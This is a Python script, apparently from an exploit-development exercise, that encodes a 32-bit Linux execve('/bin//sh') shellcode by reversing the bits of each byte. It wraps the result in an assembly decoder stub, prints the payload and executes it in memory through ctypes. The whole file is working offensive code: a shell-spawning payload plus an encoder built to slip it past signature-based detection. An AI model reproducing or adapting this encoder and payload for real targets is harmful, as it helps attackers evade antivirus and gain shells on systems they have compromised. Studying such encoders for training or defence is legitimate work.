#!/usr/bin/python3
from ctypes import CDLL, CFUNCTYPE, c_char_p, cast
from sys import argv

libc = CDLL("libc.so.6")

# Max length : 255 bytes
# Execve("/bin//sh", null, null) 
shellcode = "\\x31\\xc9\\xf7\\xe1\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\xb0\\x0b\\xcd\\x80"

#    xor ecx,ecx
#    mul ecx
#
#    push eax
#    push 0x68732f6e
#    push 0x69622f2f 
#
#    mov ebx, esp
#    mov al, 0x0b
#    int 0x80

# Reverse bits decoder
decoder = "\\xeb\\x17\\x8b\\x1c\\x24\\x31\\xc9\\xb1{0}\\x51\\xb1\\x08\\xd0\\x2b\\x10\\xc0\\xe2\\xfa\\x88\\x03\\x43\\x59\\xe2\\xf1\\xc3\\xe8\\xe4\\xff\\xff\\xff{1}"

# Convert the shellcode string into a bytes object
shellcode_b = bytes.fromhex(shellcode.replace('\\x', ''))

# Initialize encoded_shellcode, to store the bytes after encoding
encoded_shellcode = ""

# For each byte of the shellcode
for b in shellcode_b:

    # Convert the byte in a string representing its binary value, 
    # with a fixed size of 8 characters and padding with 0 {:08b}
    #
    # Reverse the string order with the slicing technique [::-1] then append "0b" to it
    # so it can be identified like a valid binary number representation
    #
    # Convert the binary representation string into an integer int(str, base=2)
    #
    # Then convert this integer into a string representation of its hexadecimal value, 
    # size of 2 characters and padding with 0 {:02x}
    #
    # Append "\\x" and add it to the encoded_shellcode string
    #
    encoded_shellcode += "\\x"+"{:02x}".format(int("0b"+"{:08b}".format(b)[::-1], base=2))

# Insert the string representation of the shellcode length hexadecimal value
# And the encoded_shellcode into the decoder payload
payload = decoder.format("\\x" + "{:02x}".format(len(shellcode_b)), encoded_shellcode)

# Convert the payload into a bytes object
payload_b = bytes.fromhex(payload.replace('\\x', ''))

print("Shellcode length : {}".format(len(shellcode_b)))
print("Shellcode with decoder stub length : {}".format(len(payload_b)), end="\n\n")
print("Encoded shellcode :")
print(encoded_shellcode)
print(encoded_shellcode.replace('\\x', ',0x')[1:], end="\n\n")

print("Encoded shellcode with decoder stub :")
print(payload, end="\n\n")

print("Exec shellcode...")

# Execute the payload
c_shell_p = c_char_p(payload_b)

launch = cast(c_shell_p, CFUNCTYPE(c_char_p))

launch()
